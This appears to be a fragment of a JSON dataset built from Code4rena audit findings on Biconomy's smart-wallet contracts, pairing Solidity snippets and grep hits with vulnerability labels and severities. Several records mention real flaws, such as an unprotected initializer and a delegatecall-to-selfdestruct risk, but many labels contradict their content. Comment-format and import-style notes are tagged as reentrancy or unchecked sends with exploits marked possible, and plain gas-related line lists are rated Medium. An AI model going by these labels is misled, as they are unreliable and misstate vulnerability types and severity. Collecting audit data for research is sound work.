    "code": "solidity=10\n    /**\n     * @dev Should return whether the signature provided is valid for the provided data\n     * @param _data Arbitrary length data signed on the behalf of address(this)\n     * @param _signature Signature byte array associated with _data\n     *\n     * MUST return the bytes4 magic value 0x20c13b0b when function passes.\n     * MUST NOT modify state (using STATICCALL for solc < 0.5, view modifier for solc > 0.5)\n     * MUST allow external calls\n     */\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Q-05 Update comment as per EIP-1271 standard",
    "description": "**FileName:** *scw-contract/contracts/smart-wallet-contract/interfaces/ISignatureValidator.sol* /** * @dev Should return whether the signature provided is valid for the provided data * @param _data Arbitrary length data signed on the behalf of address(this) * @param _signature Signature byte array associated with _data",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.472,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nhttps://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L62-L64\n\n\n**FileName:** *scw-contract/contracts/smart-wallet-contract/paymasters/BasePaymaster.sol*\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Q-08 Follow Same Comment format for all contracts",
    "description": "Follow same same multi-line comment format in all contrats. **FileName:** *scw-contract/contracts/smart-wallet-contract/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol* Correct /** * add a deposit for this paymaster and given paymasterId (Dapp Depositor address), used for paying for transaction fees",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.268,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n    // init\n    // Initialize / Setup\n    // Used to setup\n    // i. owner ii. entry point address iii. handler\n    function init(address _owner, address _entryPointAddress, address _handler) public override initializer {\n        require(owner == address(0), \"Already initialized\");\n        require(address(_entryPoint) == address(0), \"Already initialized\");\n        require(_owner != address(0),\"Invalid owner\");\n        require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n        require(_handler != address(0), \"Invalid Entrypoint\");\n        owner = _owner;\n        _entryPoint =  IEntryPoint(payable(_entryPointAddress));\n        if (_handler != address(0)) internalSetFallbackHandler(_handler);\n        setupModules(address(0), bytes(\"\"));\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "`SmartAccount`: Initialize implementation contract",
    "description": "`SmartAccount` has an unprotected intializer that can be called by anyone to claim ownership of the contract. // init // Initialize / Setup // Used to setup // i. owner ii. entry point address iii. handler",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 17,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.773,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "SmartAccount#execute",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "`SmartAccount`: Users can destroy their smart account with `delegatecall`",
    "description": "It's possible for users to destroy their smart wallets by `delegatecall`ing a function that calls `selfdestruct` via [`SmartAccount#execute`](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/base/Executor.sol#L23). In a multisig wallet with multiple signers, requireing multiple reviews and approvals for each transaction help detect and mitigate accidentally destructive actions. Since smart accounts have a single signer, the risk of accidentally destroying a wallet is much higher. Make sure any use of `delegatecall` is clearly flagged in the UI, warn or prevent `delegatecall` to unkown contracts, and consider removing this ability altogether.",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.02,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n    // init\n    // Initialize / Setup\n    // Used to setup\n    // i. owner ii. entry point address iii. handler\n    function init(address _owner, address _entryPointAddress, address _handler) public override initializer {\n        require(owner == address(0), \"Already initialized\");\n        require(address(_entryPoint) == address(0), \"Already initialized\");\n        require(_owner != address(0),\"Invalid owner\");\n        require(_entryPointAddress != address(0), \"Invalid Entrypoint\");\n        require(_handler != address(0), \"Invalid Entrypoint\");\n        __ReentrancyGuard_init();\n        owner = _owner;\n        _entryPoint =  IEntryPoint(payable(_entryPointAddress));\n        if (_handler != address(0)) internalSetFallbackHandler(_handler);\n        setupModules(address(0), bytes(\"\"));\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "`SmartAccount`: Missing reentrancy guard initializer",
    "description": "OpenZeppelin `ReentrancyGuardUpgradeable` includes [an initializer](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/25aabd286e002a1526c345c8db259d57bdf0ad28/contracts/security/ReentrancyGuardUpgradeable.sol#L40), but this function is not called in [`SmartAccount#init`](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L162-L176): // init // Initialize / Setup // Used to setup // i. owner ii. entry point address iii. handler",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 18,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.807,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nimport \"./libs/LibAddress.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\nimport \"./BaseSmartAccount.sol\";\nimport \"./common/Singleton.sol\";\nimport \"./base/ModuleManager.sol\";\nimport \"./base/FallbackManager.sol\";\nimport \"./common/SignatureDecoder.sol\";\nimport \"./common/SecuredTokenTransfer.sol\";\nimport \"./interfaces/ISignatureValidator.sol\";\nimport \"./interfaces/IERC165.sol\";\nimport \"@openzeppelin/contracts/utils/cryptography/ECDSA.sol\";\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "[L-05] Import exact functions instead of the whole contract itself",
    "description": "Example: import {ReentrancyGuardUpgradeable} from \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\"; instead of import \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\"; Applies to all contracts in Biconomy protocol.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.609,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::234 => uint256 payment = 0;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::305 => uint256 i = 0;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::458 => for (uint i = 0; i < dest.length;) { uint256 missingAccountFunds = 0;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::234 => uint256 payment = 0; 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::305 => uint256 i = 0; 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::458 => for (uint i = 0; i < dest.length;) { uint256 missingAccountFunds = 0;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.389,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol::64 => if (userOp.initCode.length == 0) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::199 => //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::201 => //console.log(\"init %s\", 21000 + msg.data.length * 8);\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::324 => // Check that signature data pointer (s) is in bounds (points to the length of data -> 32 bytes)\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::325 => require(uint256(s) + 32 <= signatures.length, \"BSA022\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::327 => // Check if the contract signature is in bounds: start of data is s + 32 and end is start + signature length\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::333 => require(uint256(s) + 32 + contractSignatureLen <= signatures.length, \"BSA023\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::467 => require(dest.length == func.length, \"wrong array lengths\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::199 => //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::201 => //console.log(\"init %s\", 21000 + msg.data.length * 8);\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::319 => // Check that signature data pointer (s) is in bounds (points to the length of data -> 32 bytes)\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::320 => require(uint256(s) + 32 <= signatures.length, \"BSA022\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::322 => // Check if the contract signature is in bounds: start of data is s + 32 and end is start + signature length\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::328 => require(uint256(s) + 32 + contractSignatureLen <= signatures.length, \"BSA023\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::457 => require(dest.length == func.length, \"wrong array lengths\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::458 => for (uint i = 0; i < dest.length;) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/BaseAccount.sol::39 => if (userOp.initCode.length == 0) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::70 => uint256 opslen = ops.length;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::98 => uint256 opasLen = opsPerAggregator.length;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::101 => totalOps += opsPerAggregator[i].userOps.length;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::111 => uint256 opslen = ops.length;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::132 => uint256 opslen = ops.length;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::174 => if (callData.length > 0) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::178 => if (result.length > 0) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::212 => if (paymasterAndData.length > 0) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::213 => require(paymasterAndData.length >= 20, \"AA93 invalid paymasterAndData\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::237 => address factory = initCode.length >= 20 ? address(bytes20(initCode[0 : 20])) : address(0);\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::262 => if (initCode.length != 0) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::264 => if (sender.code.length != 0) revert FailedOp(opIndex, address(0), \"AA10 sender already constructed\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::268 => if (sender1.code.length == 0) revert FailedOp(opIndex, address(0), \"AA15 initCode must create sender\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::299 => if (sender.code.length == 0) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::303 => if (mUserOp.paymaster != address(0) && mUserOp.paymaster.code.length == 0) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::452 => if (context.length > 0) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol::40 => * An event emitted if the UserOperation \"callData\" reverted with non-zero length\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/IPaymaster.sol::22 => *  zero length to signify postOp is not required.\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::37 => @param _ids       An array containing ids of each token being transferred (order and length must match _values array)\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::38 => @param _values    An array containing amounts of each token being transferred (order and length must match _ids array)\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/IERC1271Wallet.sol::12 => * @param _data       Arbitrary length data signed on the behalf of address(this)\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/ISignatureValidator.sol::12 => * @param _data Arbitrary length data signed on the behalf of address(this)\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/MultiSend.sol::21 => ///                     data length as a uint256 (=> 32 bytes),\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/MultiSend.sol::30 => let length := mload(transactions)\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/MultiSend.sol::34 => } lt(i, length) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/MultiSend.sol::48 => // We offset the load address by 85 byte (operation byte + 20 address bytes + 32 value bytes + 32 data length bytes)\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/MultiSend.sol::61 => // Next entry starts at 85 byte + data length\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/MultiSendCallOnly.sol::14 => ///                     data length as a uint256 (=> 32 bytes),\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/MultiSendCallOnly.sol::24 => let length := mload(transactions)\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/MultiSendCallOnly.sol::28 => } lt(i, length) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/MultiSendCallOnly.sol::42 => // We offset the load address by 85 byte (operation byte + 20 address bytes + 32 value bytes + 32 data length bytes)\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/MultiSendCallOnly.sol::56 => // Next entry starts at 85 byte + data length\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Strings.sol::20 => uint256 length = Math.log10(value) + 1;\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Strings.sol::21 => string memory buffer = new string(length);\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Strings.sol::25 => ptr := add(buffer, add(32, length))\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Strings.sol::50 => * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Strings.sol::52 => function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Strings.sol::53 => bytes memory buffer = new bytes(2 * length + 2);\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Strings.sol::56 => for (uint256 i = 2 * length + 1; i > 1; --i) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Strings.sol::60 => require(value == 0, \"Strings: hex length insufficient\");\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/libs/Strings.sol::65 => * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal representation.\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/PaymasterHelpers.sol::37 => return PaymasterData(paymasterId, signature, signature.length);\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::107 => require(sigLength == 64 || sigLength == 65, \"VerifyingPaymaster: invalid signature length in paymasterAndData\");",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol::64 => if (userOp.initCode.length == 0) { 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::199 => //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4] 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8; 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::201 => //console.log(\"init %s\", 21000 + msg.data.length * 8); 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::324 => // Check that signature data pointer (s) is in bounds (points to the length of data -> 32 bytes)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 62,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::236 => if (refundInfo.gasPrice > 0) {\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/ISignatureValidator.sol::16 => * MUST NOT modify state (using STATICCALL for solc < 0.5, view modifier for solc > 0.5)\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::236 => if (refundInfo.gasPrice > 0) { 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/ISignatureValidator.sol::16 => * MUST NOT modify state (using STATICCALL for solc < 0.5, view modifier for solc > 0.5)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.319,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/Proxy.sol::10 => /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1, and is validated in the constructor */\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::39 => // keccak256(\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::45 => // keccak256(\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::136 => return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::217 => txHash = keccak256(txHashData);\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::347 => _signer = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", dataHash)), v - 4, r, s);\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::416 => return keccak256(encodeTransactionData(_tx, refundInfo, _nonce));\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::430 => keccak256(\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::435 => keccak256(_tx.data),\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol::34 => bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol::70 => bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol::71 => bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(code)));\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::39 => // keccak256(\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::45 => // keccak256(\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::136 => return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::217 => txHash = keccak256(txHashData);\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::342 => _signer = ecrecover(keccak256(abi.encodePacked(\"\\x19Ethereum Signed Message:\\n32\", dataHash)), v - 4, r, s);\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::406 => return keccak256(encodeTransactionData(_tx, refundInfo, _nonce));\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::420 => keccak256(\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::425 => keccak256(_tx.data),\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::197 => return keccak256(abi.encode(userOp.hash(), address(this), block.chainid));\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol::74 => return keccak256(pack(userOp));\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/base/FallbackManager.sol::11 => // keccak256(\"fallback_manager.handler.address\")\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/common/Singleton.sol::9 => /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1 */\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/common/Singleton.sol::13 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1));\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::11 => This function MUST return `bytes4(keccak256(\"onERC1155Received(address,address,uint256,uint256,bytes)\"))` (i.e. 0xf23a6e61) if it accepts the transfer.\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::13 => Return of any other value than the prescribed keccak256 generated value MUST result in the transaction being reverted by the caller.\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::19 => @return           `bytes4(keccak256(\"onERC1155Received(address,address,uint256,uint256,bytes)\"))`\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::32 => This function MUST return `bytes4(keccak256(\"onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)\"))` (i.e. 0xbc197c81) if it accepts the transfer(s).\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::34 => Return of any other value than the prescribed keccak256 generated value MUST result in the transaction being reverted by the caller.\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol::40 => @return           `bytes4(keccak256(\"onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)\"))`\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/ERC721TokenReceiver.sol::16 => /// @return `bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\"))`\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/IERC1271Wallet.sol::10 => *   > The bytes4 magic value to return when signature is valid is 0x20c13b0b : bytes4(keccak256(\"isValidSignature(bytes,bytes)\")\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/IERC1271Wallet.sol::26 => *   > The bytes4 magic value to return when signature is valid is 0x20c13b0b : bytes4(keccak256(\"isValidSignature(bytes,bytes)\")\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/IERC1271Wallet.sol::28 => * @param _hash       keccak256 hash that was signed\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/interfaces/ISignatureValidator.sol::5 => // bytes4(keccak256(\"isValidSignature(bytes,bytes)\")\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::80 => return keccak256(abi.encode(\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::83 => keccak256(userOp.initCode),\n2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol::84 => keccak256(userOp.callData),",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/Proxy.sol::10 => /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1, and is validated in the constructor */ 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/Proxy.sol::16 => assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"biconomy.scw.proxy.implementation\")) - 1)); 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::39 => // keccak256( 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::45 => // keccak256( 2023-01-biconomy/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol::136 => return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this));",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 40,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
